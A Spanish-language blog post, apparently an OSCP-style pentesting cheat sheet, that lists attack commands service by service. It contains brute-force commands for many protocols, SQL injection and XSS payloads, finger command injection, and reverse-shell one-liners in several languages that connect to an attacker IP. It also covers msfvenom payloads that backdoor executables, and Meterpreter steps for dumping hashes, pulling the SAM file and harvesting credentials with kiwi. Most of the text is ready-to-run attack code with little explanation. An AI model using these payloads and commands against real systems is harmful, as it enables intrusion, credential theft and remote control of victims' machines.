---
layout: post
title:  "Guia Completa de Hacking"
description: "Aprende pentesting desde 0 con esta guia completa"
date:   2019-04-01
image:  "img/TheBibleHacker.png"
tags:   [Guia general, Pentesting, Hacking desde 0, Cheatsheet OSCP]
---

Hello Hackers!!  
El siguiente Post es una recopilacion completa donde expongo una guia completa de como enumerar, atacar y explotar diferentes servicios.  

**Nota:**  
Debido al gran contenido que abarca la seguridad informatica, este post esta en constante actualizacion.  
*- Ultima Actualizacion: 18 De Junio del 2019*  

## Tabla de contenido

**[Enumeracion Inicial](#enumeracion-inicial)**<br>
**[Enumerando el servicio FTP (Puerto 21)](#enumerando-ftp)**<br>
**[Enumerando el servicio SSH (Puerto 22)](#enumerando-ssh)**<br>
**[Enumerando el servicio SMTP (Puerto 25)](#enumerando-smtp)**<br>
**[Enumerando servicios WEB (Puerto 80/443)](#enumerando-un-sitio-web)**<br>
**[Enumerando el servicio SMB (Puerto 139/445)](#enumerando-smb)**<br>
**[Enumerando el servicio Finger (Puerto 79)](#enumerando-finger)**<br>
**[Enumerando el servicio POP3 (Puerto 110)](#enumerando-pop3)**<br>
**[Enumerando el protocolo RPCBind (Puerto 111)](#enumerando-rpcbind)**<br>
**[Enumerando el servicio SNMP (Puerto 161)](#enumerando-snmp)**<br>
**[Enumerando MySQL](#enumerando-mysql)**<br>
**[Enumerando Oracle](#enumerando-oracle)**<br>
**[SQL Injections](#sql-injections)**<br>
**[XSS Injections](#xss-injections)**<br>
**[Realizando transferencias de zonas DNS](#dns-zone-transfers)**<br>
**[Montando Sistemas de archivos compartidos](#montando-recursos-compartidos)**<br>
**[Tecnicas de Fingerprinting](#tecnicas-de-fingerprinting)**<br>
**[Realizando busqueda de Exploits](#busqueda-de-exploits)**<br>
**[Como compilar Exploits](#compilando-exploits)**<br>
**[Sniffeando Trafico](#sniffer-trafic)**<br>
**[Crackeando Contraseñas](#password-cracking)**<br>
**[Realizando Ataques de fuerza bruta](#bruteforcing)**<br>
**[Generacion de shell inversas](#shell-reverse)**<br>
**[Obteniendo Shell TTY interactiva](#obtener-shell-tty-interactiva)**<br>
**[Aprendiendo a usar Metasploit](#metasploit)**<br>


## Hacking Desde 0  
## Enumeracion Inicial  

{% highlight bash %}
# Escaneo sencillo con Nmap 
nmap -v -sV -T4 192.168.6.66
{% endhighlight %}  

{% highlight bash %}
# Ejecucion de nmap hacia todos los puertos, sin realizar descubrimiento de ping, ejecutando scripts de la categoria vuln con la velocidad T4 
nmap -v -Pn -T4 -p- --script vuln -oN machine.nmap 192.168.6.66
{% endhighlight %}  

{% highlight bash %}
# Escaneo de todos los puertos con Masscan
masscan 192.168.6.66 -p0-65535
{% endhighlight %}  

## Enumerando FTP  

| Comando FTP | Descripcion del Comando           |
|-------------|-----------------------------------|
| cd          | Cambiar del directo remoto        |
| dir         | listar el contenido de un directorio |
| get         | descargar un archivo              |
| ls          | listar el contenido de un directorio |
| mget        | descargar de multiples archivos   |
| mkdir       | Crear un directorio en la maquina remota  |
| mput        | Subir multiples archivos al servidor |
| open        | Conectar al servidor FTP             |
| put         | Subir un archivo                     |
| quit        | Finalizar la sesion de FTP            |

{% highlight bash %}
# Banner grab
nc 192.168.6.66 21
{% endhighlight %}  

{% highlight bash %}
# Ejecucion de Scripts de Nmap sobre un servidor FTP
nmap --script ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -p 21 192.168.6.66
{% endhighlight %}  

{% highlight bash %}
# Validando inicio de sesion anonimo, las credenciales para este son: anonymous:anonymous
ftp 192.168.6.66
{% endhighlight %}  

{% highlight bash %}
# Realizando Ataque fuerza bruta con hydra hacia el servicio FTP
hydra 192.168.6.66 ftp -l username -P /usr/share/wordlists/rockyou.txt -e ns -vV
{% endhighlight %}  

**Archivos de configuracion relacionados a FTP**
  - ftpusers
  - ftp.conf
  - proftpd.conf

## Enumerando SSH  

{% highlight bash %}
# Iniciar sesion por SSH
ssh usuario@192.168.6.66
{% endhighlight %}  

{% highlight bash %}
# Fuerza Bruta para el servicio SSH con Hydra
hydra -l root -P /usr/share/wordlists/rockyou.txt 192.168.6.66 -t 4 ssh
{% endhighlight %}  

**Programas clientes para SSH**  
tunnelier  
winsshd  
putty  
winscp  

**Archivos de configuracion relacionados a SSH**
  - ssh_config
  - sshd_config
  - authorized_keys
  - ssh_known_hosts
  - .shosts

## Enumerando SMTP  

| SMTP Command | Description of Command                                                                                                                                                                     |
|--------------|--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| HELO         | It’s the first SMTP command: is starts the conversation identifying the sender server and is generally followed by its domain name.                                                        |
| EHLO         | An alternative command to start the conversation, underlying that the server is using the Extended SMTP protocol.                                                                          |
| MAIL FROM    | With this SMTP command the operations begin: the sender states the source email address in the “From” field and actually starts the email transfer.                                        |
| RCPT TO      | It identifies the recipient of the email; if there are more than one, the command is simply repeated address by address.                                                                   |
| DATA         | With the DATA command the email content begins to be transferred; it’s generally followed by a 354 reply code given by the server, giving the permission to start the actual transmission. |
| VRFY         | The server is asked to verify whether a particular email address or username actually exists.                                                                                              |
| QUIT         | It terminates the SMTP conversation.                                                                                                                                                       |  

{% highlight bash %}
# Banner grab
nc 192.168.6.66 25
{% endhighlight %}  

{% highlight bash %}
# Banner grab
telnet 192.168.6.66 21
{% endhighlight %}  

{% highlight bash %}
#Ejecuccion de scripts de Nmap Sobre un servidor SMTP
nmap –script smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 192.168.6.66
{% endhighlight %}  

**Mail Spoof Test**  
{% highlight markdown %}  
HELO anything.com  
MAIL FROM: spoofed_address  
RCPT TO:valid_mail_account  
DATA   
.   
QUIT  
{% endhighlight %}    

**Archivos de configuracion relacionados a SMTP**  

sendmail.cf  
submit.cf  

## Enumerando un sitio WEB

Como realizar un descubrimiento de directorios:  

{% highlight markdown %}
dirb http://10.0.0.1/
gobuster -w diccionario.txt -u http://10.10.10.59/
{% endhighlight %}     

Realizando un analisis de vulnerabilidades con Nikto

{% highlight markdown %}
nikto -h 10.0.0.1
{% endhighlight %}     

**Crackear peticiones GET**  

{% highlight markdown %}
hydra -l username -p wordlist -t thread -vV -e ns IP http-get /admin/
hydra -l username -p wordlist -t thread -vV -e ns -f IP http-get /admin/index.php  
{% endhighlight %}     

**Crackear peticiones POST**  
*Ejemplo de formulario WEB a crackear*  

{% highlight html %}
<form action=”index.php” method=”POST”>
  <input type=”text” name=”name” /><br><br>
  <input type=”password” name=”pwd” /><br><br>
  <input type=”submit” name=”sub” value=”submit”>
</form>
{% endhighlight %}     

Commando para Cracking de formularios POST：  
{% highlight markdown %}
hydra -l admin -P pass.lst -o ok.lst -t 1 -f 127.0.0.1 http-post-form “index.php:name=^USER^&pwd=^PASS^ <title>invalido</title>”
{% endhighlight %}   

**Herramientas Utiles**  
Burpsuite

**Archivos de configuracion relacionados a sitios web**  
  - Examinar httpd.conf/  
  - JBoss
    - JMX Console http://<IP>:8080/jmxconcole/
      - War File  
  - Joomla
    - configuration.php
    - diagnostics.php
    - joomla.inc.php
    - config.inc.php  
  - Mambo
    - configuration.php
    - config.inc.php  
  - Wordpress
    - setup-config.php
    - wp-config.php

## Enumerando SMB

{% highlight markdown %}
enum4linux –a 10.0.0.1
{% endhighlight %}     

Para Descubrir servidores SAMBA de Windows en la subred, encuentrar las direcciones MAC de Windows, el nombre de netbios y descubrimiento del grupo de trabajo y dominio del cliente  

{% highlight markdown %}
nbtscan x.x.x.x
{% endhighlight %}     

**Escaneo con Nmap y ejecucion de Scripts relacionados.**  

{% highlight markdown %}
nmap IPADDR --script smb-enum-domains.nse,smb-enum-groups.nse,smb-enum-processes.nse,smb-enum-sessions.nse,smb-enum-shares.nse,smb-enum-users.nse,smb-ls.nse,smb-mbenum.nse,smb-os-discovery.nse,smb-print-text.nse,smb-psexec.nse,smb-security-mode.nse,smb-server-stats.nse,smb-system-info.nse,smb-vuln-conficker.nse,smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-regsvc-dos.nse
{% endhighlight %}     

Listado de archivos de un servidor SMB.  

{% highlight markdown %}
smbclient -L //INSERTIPADDRESS/
{% endhighlight %}     

{% highlight markdown %}   
---------------------
-- COMANDOS UTILES --
---------------------
smbclient \\\\10.10.10.59\\ACCT
{% endhighlight %}     

**Ataque de diccionario hacia el servicio de SMB**  

{% highlight markdown %}
hydra -l administrator -P pass.txt IP smb
{% endhighlight %}     

**Archivos de configuracion relacionados a SMB**  
  - Smb.conf  
  - lmhosts

## Enumerando Finger

Descargar el siguiente script para enumerar este servicio:  
http://pentestmonkey.net/tools/user-enumeration/finger-user-enum

{% highlight markdown %}
---------------------
-- COMANDOS UTILES --
---------------------
finger 'a b c d e f g h' @example.com
finger admin@example.com
finger user@example.com
finger 0@example.com
finger .@example.com
finger **@example.com
finger test@example.com
finger @example.com
{% endhighlight %}     

**Probando Ejecucion de comandos**  

{% highlight markdown %}
finger "|/bin/id@example.com"
finger "|/bin/ls -a /@example.com"
{% endhighlight %}     

## Enumerando POP3

{% highlight markdown %}
---------------------
-- COMANDOS UTILES --
---------------------
telnet INSERTIPADDRESS 110
Ingresa tu usuario [username]
Ingresa tu contraseña [password]
- Despues de iniciar sesion. -

list
- El comando anterior lista los mensajes. -
{% endhighlight %}      

**Escaneo con Nmap y ejecucion de Scripts relacionados.**  
{% highlight markdown %}
nmap -p110 –script pop3-brute google.com
nmap -p110 –script pop3-capabilities target
{% endhighlight %}      

**Usando Hydra sobre POP3**  
{% highlight markdown %}
hydra -l muts -P pass.txt my.pop3.mail pop3
{% endhighlight %}      

## Enumerando SNMP

{% highlight markdown %}
snmpwalk -c public -v1 10.0.0.0
{% endhighlight %}      

{% highlight markdown %}
snmpcheck -t 192.168.1.X -c public
{% endhighlight %}      

{% highlight markdown %}
onesixtyone -c names -i hosts
{% endhighlight %}      

{% highlight markdown %}
nmap -sT -p 161 192.168.X.X -oG snmp_results.txt
{% endhighlight %}      

{% highlight markdown %}
snmpenum -t 192.168.1.X
{% endhighlight %}      

**Archivos de configuracion relacionados a SNMP**  
  - snmp.conf  
  - snmpd.conf  
  - snmp-config.xml    

## Enumerando MySQL

{% highlight markdown %}
mysql -h <Hostname> -u root@localhost
{% endhighlight %}        

**Escaneo con Nmap y ejecucion de Scripts relacionados.**   

{% highlight markdown %}
nmap -sV -Pn -vv  10.0.0.1 -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122
{% endhighlight %}        

{% highlight sql %}
---------------------
-- COMANDOS UTILES --
---------------------
-- Ver base de datos disponibles.
SHOW DATABASES;
-- Crear una base de datos
CREATE DATABASE mydb;
-- Seleccionar una base de datos para proximas consultas.
USE mydb;
-- Eliminar una base de datos
DROP DATABASE mydb;
-- Obtener tablas de una base de datos
SHOW TABLES;
-- Crear una tabla
CREATE TABLE table1;
-- MOSTRAR DATOS
SELECT * FROM table1;
{% endhighlight %}     


**Archivos relacionados a MYSQL**  
WINDOWS  
  - config.ini
  - my.ini
  - windows\my.ini
  - winnt\my.ini
  - <InstDir>/mysql/data/

UNIX  
  - my.cnf
  - /etc/my.cnf
  - /etc/mysql/my.cnf
  - /var/lib/mysql/my.cnf
  - ~/.my.cnf
  - /etc/my.cnf

Otros Archivos.  
  - connections.log  
  - update.log  
  - common.log  

**Creaccion de usuarios**  
Crear usuario y otorgarle privilegios:  

{% highlight sql %}
mysql>create user test identified by 'test';
mysql> grant SELECT,CREATE,DROP,UPDATE,DELETE,INSERT on *.* to mysql identified by 'mysql' WITH GRANT OPTION;
{% endhighlight %}       

**Escalando privilegios**  

{% highlight sql %}  
mysql> \! cat /etc/passwd
mysql> \! bash
{% endhighlight %}       

## Enumerando Oracle

{% highlight markdown %}
tnscmd10g version -h INSERTIPADDRESS
tnscmd10g status -h INSERTIPADDRESS
{% endhighlight %}       

**Contraseñas por defecto:**  

{% highlight markdown %}
http://www.vulnerabilityassessment.co.uk/default_oracle_passwords.htm
{% endhighlight %}       

## SQL Injections

**Inyeccion en formularios de inicio de sesion** 

{% highlight sql %}  
admin' --
admin' #
admin'/*
' or 1=1--
' or 1=1-- -
' or 1=1#
') or '1'='1--
') or ('1'='1—
' or 1=1/*
root' --
root' #
root'/*
root' or '1'='1
root' or '1'='1'--
root' or '1'='1'#
root' or '1'='1'/*
root'or 1=1 or ''='
root' or 1=1
root' or 1=1--
root' or 1=1#
root' or 1=1/*
root') or ('1'='1
root') or ('1'='1'--
root') or ('1'='1'#
root') or ('1'='1'/*
root') or '1'='1
root') or '1'='1'--
root') or '1'='1'#
root') or '1'='1'/*
or 1=1
or 1=1--
or 1=1#
or 1=1/*
' or 1=1
' or 1=1--
' or 1=1#
' or 1=1/*
" or 1=1
" or 1=1--
" or 1=1#
" or 1=1/*
1234 ' AND 1=0 UNION ALL SELECT 'root', '81dc9bdb52d04dc20036dbd8313ed055
root" --
root" #
root"/*
root" or "1"="1
root" or "1"="1"--
root" or "1"="1"#
root" or "1"="1"/*
root" or 1=1 or ""="
root" or 1=1
root" or 1=1--
root" or 1=1#
root" or 1=1/*
root") or ("1"="1
root") or ("1"="1"--
root") or ("1"="1"#
root") or ("1"="1"/*
root") or "1"="1
root") or "1"="1"--
root") or "1"="1"#
{% endhighlight %}      

**Luego de encontrar un sitio vulnerable a una inyeccion SQL** 

{% highlight sql %}
union select 1,2-- -
union select 1,@@version
union select all 1,database()
union select all 1,table_schema from information_schema.tables 
union select all 1,table_name from information_schema.tables where table_schema='sysadmin' 
union select all 1,column_name from information_schema.columns where table_name='users' 
union select 1,(select group_concat(username,password) from sysadmin.users) 
{% endhighlight %}        


*Uso de SQLMAP*

{% highlight markdown %}
sqlmap -u "http://meh.com/meh.php?id=1" --dbms=mysql --tech=U --random-agent --dump
{% endhighlight %}    

## XSS Injections  

Prueba de XSS básica sin filtro de evasión  
{% highlight html %}  
<SCRIPT SRC=http://192.168.1.5/xss.js></SCRIPT>   
{% endhighlight %}    

Usando la etiqueta IMG con la directiva de JavaScript  
{% highlight html %}  
<img SRC="javascript:alert('Hacked By Gerh');">    
{% endhighlight %}    
  
Evadiendo filtros anti XSS haciendo uso de minusculas y mayusculas    
{% highlight html %}  
<img SRC="JaVaScRiPt:alert('XSS')">  
{% endhighlight %}    

Etiquetas IMG mal formadas  

{% highlight html %}  
<img """><SCRIPT>alert("XSS")</SCRIPT>">  
{% endhighlight %}    

Haciendo uso del parametro **onerror**  

{% highlight html %}  
<img SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img>  
{% endhighlight %}    

Haciendo uso de representación hexadecimal  

{% highlight html %}    
<script>eval(String.fromCharCode(97, 108, 101, 114, 116, 40, 34, 72, 97, 99, 107, 101, 100, 32, 66, 121, 32, 71, 101, 114, 104, 34, 41))</script>
{% endhighlight %}     


Referencia importante:  https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet  

## DNS Zone Transfers

{% highlight markdown %}
nslookup -> set type=any -> ls -d blah.com
{% endhighlight %}    

{% highlight markdown %}
dig axfr blah.com @ns1.blah.com
{% endhighlight %}    

*Enumerando*

{% highlight markdown %}
dnsrecon -d TARGET -D /usr/share/wordlists/dnsmap.txt -t std --xml ouput.xml
{% endhighlight %}    

{% highlight markdown %}
dnsenum --noreverse -o mydomain.xml example.com
{% endhighlight %}    

## Montando recursos compartidos

{% highlight markdown %}
showmount -e IPADDR
{% endhighlight %}    

Montando el recurso compartido en /mnt/nfs sin bloquearlo  

{% highlight markdown %}
mount 192.168.1.1:/vol/share /mnt/nfs  -nolock
{% endhighlight %}    

Montando recurso compartido de Windows CIFS/SMB, en Linux en la ruta /mnt/cifs.   

{% highlight markdown %}
mount -t cifs -o username=user,password=pass,domain=blah //192.168.1.X/share-name /mnt/cifs
{% endhighlight %}    

Montando recursos compartidos en Windows.  

{% highlight markdown %}
net use Z: \\win-server\share password  /user:domain\janedoe /savecred /p:no
{% endhighlight %}    

## Tecnicas de Fingerprinting

{% highlight markdown %}
nc -v 192.168.1.1 25
{% endhighlight %}    

{% highlight markdown %}
telnet 192.168.1.1 25
{% endhighlight %}    

{% highlight markdown %}
nmap -o -v binarychaos.com
{% endhighlight %}    

## Busqueda de Exploits

En el siguiente ejemplo realizo una busqueda de exploits relacionados a windows 8.1  

{% highlight markdown %}
searchsploit windows 8.1 | grep -i local
{% endhighlight %}    


## Compilando Exploits

{% highlight markdown %}
gcc -o exploit exploit.c
{% endhighlight %}    

{% highlight markdown %}
i586-mingw32msvc-gcc exploit.c -lws2_32 -o exploit.exe
{% endhighlight %}    


## Sniffer Trafic

En el siguiente comando, realizo una captura de los paquetes del puerto 80 por el protocolo TCP por medio de la interfaz eth0 y exporto el resultado en un archivo con nombre *output.pcap*.  

{% highlight markdown %}
tcpdump tcp port 80 -w output.pcap -i eth0
{% endhighlight %}    

## Password Cracking

Para la identificacion del tipo de hash utilizar:  

{% highlight markdown %}
https://www.tunnelsup.com/hash-analyzer/
hash-identifier [hash]
john hashes.txt
{% endhighlight %}    

Ejemplos de uso de Hashcat:  

{% highlight markdown %}
hashcat -m 500 -a 0 -o output.txt –remove hashes.txt /usr/share/wordlists/rockyou.txt
{% endhighlight %}    

Lista de tipos de hash's soportados por Hashcat:  

{% highlight markdown %}
https://hashcat.net/wiki/doku.php?id=example_hashes 
{% endhighlight %}    

## Bruteforcing

**Ejemplos del uso de Hydra**  
*Fuerza bruta a formulario enviado por Peticion POST*    
{% highlight markdown %}
hydra 10.0.0.1 http-post-form “/admin.php:target=auth&mode=login&user=^USER^&password=^PASS^:invalid” -P /usr/share/wordlists/rockyou.txt -l admin
{% endhighlight %}    

{% highlight markdown %}
hydra -l admin -P /usr/share/wordlists/rockyou.txt -o results.txt IPADDR PROTOCOL
{% endhighlight %}    

**Usando Hydra para realizar un ataque de fuerza bruta hacia el servicio de SSH**  
{% highlight markdown %}
hydra -L users.txt -P password.txt -vV -o ssh.log -e ns IP ssh
{% endhighlight %}    

**Usando Hydra para realizar un ataque de fuerza bruta hacia HTTPS**  
{% highlight markdown %}
hydra -m /index.php -l username -P pass.txt IP https
{% endhighlight %}    

**Usando Hydra para realizar un ataque de fuerza bruta hacia teamspeak**  
{% highlight markdown %}
hydra -l username -P wordlist -s portnumber -vV ip teamspeak
{% endhighlight %}    

**Usando Hydra para realizar un ataque de fuerza bruta hacia CISCO**  
{% highlight markdown %}
hydra -P pass.txt IP cisco
hydra -m cloud -P pass.txt 192.168.1.11 cisco-enable
{% endhighlight %}    

**Usando Hydra para realizar un ataque de fuerza bruta hacia el servicio de SMB**  
{% highlight markdown %}
hydra -l administrator -P pass.txt IP smb
{% endhighlight %}    

**Usando Hydra para realizar un ataque de fuerza bruta hacia el servicio de POP3**  
{% highlight markdown %}
hydra -l muts -P pass.txt my.pop3.mail pop3
{% endhighlight %}    

**Usando Hydra para realizar un ataque de fuerza bruta hacia el servicio de RDP**  
{% highlight markdown %}
hydra IP rdp -l administrator -P pass.txt -V
{% endhighlight %}    

**Usando Hydra para realizar un ataque de fuerza bruta hacia el servicio de http-proxy**  
{% highlight markdown %}
hydra -l admin -P pass.txt http-proxy://192.168.1.111
{% endhighlight %}    

**Usando Hydra para realizar un ataque de fuerza bruta hacia el servicio de TELNET**  
{% highlight markdown %}
hydra IP telnet -l username -P wordlist -t 32 -s 23 -e ns -f -V
{% endhighlight %}    

**Usando Hydra para realizar un ataque de fuerza bruta hacia el servicio de FTP**  
{% highlight markdown %}
hydra IP ftp -l username -P wordlist -t thread(default 16) -vV
hydra IP ftp -l username -P wordlist -e ns -vV
{% endhighlight %}    

**Generacion de diccionarios**  

{% highlight bash %}
crunch 15 15 -f /usr/share/crunch/charset.lst symbols14 -t Th4C00lTheacha@ -o bruteforce.dic
{% endhighlight %}    

{% highlight bash %}
---------------------
-- COMANDOS UTILES --
---------------------
for i in {0..9}; do echo Th4C00lTheacha$i; done >> hoola.txt
{% endhighlight %}    


## Shell-Reverse

**BASH**
{% highlight bash %}  
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
{% endhighlight %}    

**PERL**
{% highlight perl %}  
perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
{% endhighlight %}     

**Python**
{% highlight python %}  
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
{% endhighlight %}     

**PHP**
{% highlight php %}  
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
{% endhighlight %}     

**RUBY**
{% highlight ruby %}
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
{% endhighlight %}     

**Netcat**
{% highlight bash %}
//Ejecutar lo siguiente en la victima:  
// IP VICTIMA = 10.10.10.69

nc -e /bin/sh 10.10.14.10 1234

//Luego de ejecutar lo anterior en el equipo victima, ejecutar lo siguiente en la maquina atacante:  
// IP ATACANTE = 10.10.14.10

nc -nvlp 10.10.10.69

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
{% endhighlight %}     

**JAVA**
{% highlight java %}
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
{% endhighlight %}     

## Obtener Shell TTY interactiva

{% highlight bash %}
python -c 'import pty; pty.spawn("/bin/sh")'
python3 -c 'import pty; pty.spawn("/bin/sh")'
{% endhighlight %}   

{% highlight bash %}
echo os.system('/bin/bash')
{% endhighlight %}   

{% highlight bash %}
/bin/sh -i
{% endhighlight %}   

{% highlight bash %}
execute('/bin/sh')
{% endhighlight %}   

{% highlight perl %}  
perl -e 'exec "/bin/sh";'
{% endhighlight %}   

{% highlight ruby %}
ruby: exec "/bin/sh"
{% endhighlight %}   

Usando vi / vim 
{% highlight bash %}
:!bash
{% endhighlight %}   

Usando man, more, less
{% highlight bash %}
!bash
{% endhighlight %}   

## Metasploit

**Generacion de payloads con msfvenom**  

### Web Payloads

| Comandos         | Explicacion                                                                 |
| --------         | ------------------------------------------------------------------          |
| msfvenom -p php/meterpreter_reverse_tcp LHOST={DNS / IP / VPS IP} LPORT={PORT / Forwarded PORT} -f raw > example.php | Creacion de Shell Inversa para PHP por el protocolo TCP
| msfvenom -p windows/meterpreter/reverse_tcp LHOST={DNS / IP / VPS IP} LPORT={PORT / Forwarded PORT} -f asp > example.asp | Creacion de Shell Inversa para ASP por el protocolo TCP
| msfvenom -p java/jsp_shell_reverse_tcp LHOST={DNS / IP / VPS IP} LPORT={PORT / Forwarded PORT} -f raw > example.jsp | Creacion de Shell Inversa para JSP por el protocolo TCP
| msfvenom -p java/jsp_shell_reverse_tcp LHOST={DNS / IP / VPS IP} LPORT={PORT / Forwarded PORT} -f war > example.war | Creacion de Shell Inversa para WAR por el protocolo TCP |

### Windows Payloads

| Comandos         | Explicacion                                                                 |
| --------         | ------------------------------------------------------------------          |
| msfvenom -l encoders | Lista los encoders disponibles
| msfvenom -x base.exe -k -p windows/meterpreter/reverse_tcp LHOST={DNS / IP / VPS IP} LPORT={PORT / Forwarded PORT} -f exe > example.exe |	Enlazar un ejecutable con un backdoor ejecutable EXE
| msfvenom -p windows/meterpreter/reverse_tcp LHOST={DNS / IP / VPS IP} LPORT={PORT / Forwarded PORT} -e x86/shikata_ga_nai -b ‘\x00’ -i 3 -f exe > example.exe | Crea una carga útil simple para el protocolo TCP con el codificador shikata_ga_nai
| msfvenom -x base.exe -k -p windows/meterpreter/reverse_tcp LHOST={DNS / IP / VPS IP} LPORT={PORT / Forwarded PORT} -e x86/shikata_ga_nai -i 3 -b “\x00” -f exe > example.exe | Enlazar un ejecutable con un backdoor y lo codifica con shikata_ga_nai |

### Binaries

| Comandos         | Explicacion                                                                 |
| --------         | ------------------------------------------------------------------          |
| msfvenom -p windows/meterpreter/reverse_tcp LHOST={DNS / IP / VPS IP} LPORT={PORT / Forwarded PORT} -f exe > example.exe |	Creacion de una carga útil simple para Windows usando el protocolo TCP
| msfvenom -p windows/meterpreter/reverse_http LHOST={DNS / IP / VPS IP} LPORT={PORT / Forwarded PORT} -f exe > example.exe	|Creacion de una carga útil simple para Windows usando el protocolo HTTP
| msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={DNS / IP / VPS IP} LPORT={PORT / Forwarded PORT} -f elf > example.elf |	Creacion de una carga útil simple para Linux usando el protocolo TCP
| msfvenom -p osx/x86/shell_reverse_tcp LHOST={DNS / IP / VPS IP} LPORT={PORT / Forwarded PORT} -f macho > example.macho |	Creacion de una shell simple para MAC usando el protocolo TCP
| msfvenom -p android/meterpreter/reverse/tcp LHOST={DNS / IP / VPS IP} LPORT={PORT / Forwarded PORT} R > example.apk |	Creacion de una carga útil simple para Android usando el protocolo TCP |

**Como conseguir una shell con meterpreter!**

{% highlight zsh %}  
╭─[~/Desktop/APOLO/Ethic4l-Hacking/]─[root@Arthorias]─[0]─[4186]
╰─[:)] # msfconsole
msf5 > use exploit/multi/handler
msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf5 exploit(multi/handler) > set lhost 192.168.1.123
lhost => 192.168.1.123
msf5 exploit(multi/handler) > set lport 4444
lport => 4444
msf5 exploit(multi/handler) > run
{% endhighlight %}     

**Como usar Meterpreter**  

Luego de comprometer una maquina y tener una shell de meterpreter, hay multiples comandos que nos facilitaran la vida en la hora de interactuar con nuestra maquina victima.  

**Comandos Utiles**
Como subir un archivo a una maquina comprometida con windows
{% highlight markdown %}  
upload file c:\\windows
{% endhighlight %}     

Como descargar un archivo que este alojado en el equipo victima y guardarlo en nuestro equipo.
{% highlight markdown %}  
download c:\\windows\\repair\\sam /tmp
{% endhighlight %}     

Como ejecutar archivos (EXE) alojados en la maquina comprometida.  
*Esto es util para la ejecucion de exploits.*
{% highlight markdown %}  
execute -f c:\\windows\temp\exploit.exe
{% endhighlight %}     

Crea un nuevo canal con una Shell de CMD
{% highlight markdown %}  
execute -f cmd -c
{% endhighlight %}     

Como ver los procesos que corre nuestra maquina comprometida.  
{% highlight markdown %}  
ps
{% endhighlight %}     

Como obtener una shell en la maquina comprometida.  
{% highlight markdown %}  
shell
{% endhighlight %}     

Realizar un intento para escalar privilegios sobre el sistema.  
{% highlight markdown %}  
getsystem
{% endhighlight %}     

El comando hashdump permite obtener los usuarios y el hash de los passwords de la maquina remota en formato SAM, de esta forma se puede crakear la clave de un usuario determinado usando herramientas como john the ripper o ophcrack
{% highlight markdown %}  
hashdump
{% endhighlight %}     

Como redirigir puertos a través de la máquina comprometida hacia nosotros los atacantes.
{% highlight markdown %}  
portfwd add -l 3389 -p 3389 -r target
{% endhighlight %}     

Eliminar alguna redireccion de puertos previamente configurada.
{% highlight markdown %}  
portfwd delete -l 3389 -p 3389 -r target
{% endhighlight %}     

Burlar el Control de Cuentas de Usuario (UAC) en Windows 7 // Indicar la IP de la victima como target + arch, x86/64
{% highlight markdown %}  
use exploit/windows/local/bypassuac
{% endhighlight %}     

Analizador de directorios HTTP
{% highlight markdown %}  
use auxiliary/scanner/http/dir_scanner
{% endhighlight %}     

Escaner de vulnerabilidades para JBOSS
{% highlight markdown %}  
use auxiliary/scanner/http/jboss_vulnscan
{% endhighlight %}     

Modulo para autenticarse en el servicio MSSQL.
{% highlight markdown %}  
use auxiliary/scanner/mssql/mssql_login
{% endhighlight %}     

Identificar la version de MySQL.
{% highlight markdown %}  
use auxiliary/scanner/mysql/mysql_version
{% endhighlight %}     

Modulo para autenticarse en el servicio de Oracle
{% highlight markdown %}  
use auxiliary/scanner/oracle/oracle_login
{% endhighlight %}     

Ejecucion de script en powershell para una sesion de meterpreter
{% highlight markdown %}  
post/windows/manage/powershell/exec_powershell
{% endhighlight %}     

Ver privilegios del usuario actual.
{% highlight markdown %}  
run post/windows/gather/win_privs
{% endhighlight %}     

Obtener contraseñas guardadas GPP
{% highlight markdown %}  
use post/windows/gather/credentials/gpp
{% endhighlight %}     

Cargar Mimikatz/kiwi para conseguir credenciales de usuarios autenticados.
{% highlight markdown %}  
load kiwi
creds_all
{% endhighlight %}   
